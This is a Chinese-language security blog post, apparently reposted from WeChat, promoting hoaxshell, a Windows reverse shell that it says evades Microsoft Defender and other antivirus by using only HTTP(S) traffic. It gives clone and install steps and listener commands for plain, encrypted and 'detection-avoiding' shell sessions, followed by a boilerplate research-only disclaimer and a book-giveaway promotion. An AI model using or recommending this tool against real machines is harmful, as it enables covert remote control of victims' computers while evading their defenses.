> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fkXwsdqhVL6YsQxaxJkLbg)

> 项目作者：t3l3machus
> 
> 项目地址：https://github.com/t3l3machus/hoaxshell

**0x01 工具介绍**

hoaxshell 是一种非常规的 Windows 反向 shell，目前未被 Microsoft Defender 和可能的其他 AV 解决方案检测到，因为它完全基于 http(s) 流量。该工具易于使用，它生成自己的 PowerShell 有效负载并支持加密 (ssl)。

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibtF4v7VldmFgbVEICyeHqKqoNia5sa6ibMtCpJzrlcFt3eng89Le3LQLbJV8c64seBpO2oX5LOzU1dQ/640?wx_fmt=png)

**0x02 安装与使用**

1、安装需要的库文件

```
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

2、通过 http 的基本 shell 会话

```
sudo python3 hoaxshell.py -s <your_ip>
```

3、避免检测的推荐用法（通过 http）

```
sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
```

4、加密的 shell 会话 (https)

```
# Generate self-signed certificate:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Pass the cert.pem and key.pem as arguments:
sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
```

5、具有可信证书的加密 shell 会话

```
sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
```

6、抓取会话模式

```
sudo python3 hoaxshell.py -s <your_ip> -g
```

**0x03 下载地址**

1、通过项目地址下载

2、关注 web 安全工具库公众号，后台回复：20220906

**0x04 声明**

仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者不承担任何法律及连带责任。

**推 荐 阅 读**

加我微信：ivu123ivu，进送书活动群，不定时免费送书

《代码大全 2（纪念版）》

![](https://mmbiz.qpic.cn/mmbiz_png/8H1dCzib3UibtF4v7VldmFgbVEICyeHqKqibIiac9nC06MF5hesrKsic5qMkibp3Ek5wPUTzV54yjf3sRpicPZSAc8zlA/640?wx_fmt=png)

> 《软件开发》杂志 Jolt 大奖。大而全，洞悉软件构建精髓；优而先，兼顾行业实践研究；奠定硬核技术领导力的经典；庸常变身卓越的实用性指导。